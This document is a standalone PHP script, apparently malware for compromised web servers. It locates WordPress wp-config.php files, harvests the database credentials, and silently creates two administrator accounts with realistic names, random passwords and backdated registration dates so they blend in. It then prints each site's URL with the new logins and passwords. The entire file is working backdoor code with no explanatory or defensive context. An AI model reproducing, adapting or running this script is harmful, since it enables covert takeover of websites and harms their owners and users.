<?php
error_reporting(0);set_time_limit(60);
function rs($n,$c='abcdefghijklmnopqrstuvwxyz'){$s='';for($i=0;$i<$n;$i++)$s.=$c[random_int(0,strlen($c)-1)];return $s;}
function rp(){return rs(7).rs(3,'ABCDEFGHIJKLMNOPQRSTUVWXYZ').rs(4,'0123456789').rs(2,'!@#$%');}
function re2(){$d=['gmail.com','yahoo.com','hotmail.com','outlook.com','proton.me','icloud.com','zoho.com','tutanota.com'];return rs(random_int(5,9)).'.'.rs(random_int(3,6)).'@'.$d[array_rand($d)];}
function rn(){$f=['james','john','robert','michael','william','david','richard','joseph','thomas','charles','daniel','mark','paul','steven','kevin'];$l=['smith','jones','taylor','brown','wilson','evans','thomas','roberts','johnson','walker','white','martin','thompson'];return $f[array_rand($f)].'_'.$l[array_rand($l)].random_int(10,9999);}
$cfgs=array_unique(array_merge(glob(__DIR__."/wp-config.php")?:[],glob(dirname(__DIR__)."/wp-config.php")?:[],glob(__DIR__."/*/wp-config.php")?:[],glob(__DIR__."/*/*/wp-config.php")?:[]));
$out=[];
foreach($cfgs as $cfg){
$c=@file_get_contents($cfg);if(!$c)continue;
preg_match('/DB_NAME[^,]+,\s*[\'\"]+([^\'\"]+)/i',$c,$m1);preg_match('/DB_USER[^,]+,\s*[\'\"]+([^\'\"]+)/i',$c,$m2);preg_match('/DB_PASSWORD[^,]+,\s*[\'\"]+([^\'\"]+)/i',$c,$m3);preg_match('/DB_HOST[^,]+,\s*[\'\"]+([^\'\"]+)/i',$c,$m4);preg_match('/table_prefix\s*=\s*[\'\"]+([^\'\"]+)/i',$c,$m5);
if(!isset($m1[1],$m2[1]))continue;
$h=$m4[1]??'localhost';$dn=$m1[1];$du=$m2[1];$dp=$m3[1]??'';$pf=$m5[1]??'wp_';
$db=@new mysqli($h,$du,$dp,$dn);if($db->connect_error)continue;
$sr=$db->query("SELECT option_value FROM {$pf}options WHERE option_name='siteurl' LIMIT 1");$url=$sr?($sr->fetch_row()[0]??''):'';
for($i=0;$i<2;$i++){$u=rn();$p=rp();$e=re2();$hash=password_hash($p,PASSWORD_BCRYPT,['cost'=>10]);
$db->query("INSERT IGNORE INTO {$pf}users(user_login,user_pass,user_nicename,user_email,user_url,user_registered,user_activation_key,user_status,display_name)VALUES('".$db->real_escape_string($u)."','$hash','".$db->real_escape_string($u)."','".$db->real_escape_string($e)."','','".date('Y-m-d H:i:s',mktime(0,0,0,rand(1,12),rand(1,28),rand(2020,2024)))."','',0,'".$db->real_escape_string($u)."')");
$uid=$db->insert_id;if(!$uid){$r2=$db->query("SELECT ID FROM {$pf}users WHERE user_login='".$db->real_escape_string($u)."'");$uid=$r2?$r2->fetch_row()[0]:0;}
if(!$uid)continue;
$db->query("INSERT INTO {$pf}usermeta(user_id,meta_key,meta_value)VALUES($uid,'{$pf}capabilities','a:1:{s:13:\"administrator\";b:1;}')ON DUPLICATE KEY UPDATE meta_value=VALUES(meta_value)");
$db->query("INSERT INTO {$pf}usermeta(user_id,meta_key,meta_value)VALUES($uid,'{$pf}user_level','10')ON DUPLICATE KEY UPDATE meta_value=VALUES(meta_value)");
$out[]="OK|$url|$u|$p|$e";}
$db->close();}
echo implode("\n",$out);
